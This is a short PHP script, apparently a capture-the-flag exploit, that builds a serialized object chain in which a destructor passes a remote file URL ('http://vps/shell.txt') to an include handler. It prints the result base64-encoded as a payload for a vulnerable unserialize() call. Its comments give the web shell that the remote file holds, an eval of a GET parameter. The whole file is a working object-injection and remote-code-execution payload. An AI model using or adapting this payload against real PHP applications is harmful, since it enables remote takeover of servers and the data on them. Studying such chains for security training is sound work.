<?php
class Log{
	// shell.txt
	// <?php
	//	eval($_GET['a']);

	private $type_log = "http://vps/shell.txt";
	
	public function handler($val){
		//include($this->type_log);

	}
}

class User{
	private $name;
	private $wel;

	function __construct(){
		$this->name = "admin";
		$this->wel = new Log();
	}

	function __destruct(){
		$this->wel->handler($this->name);
	}
}

$a = new User();
echo base64_encode(serialize($a));
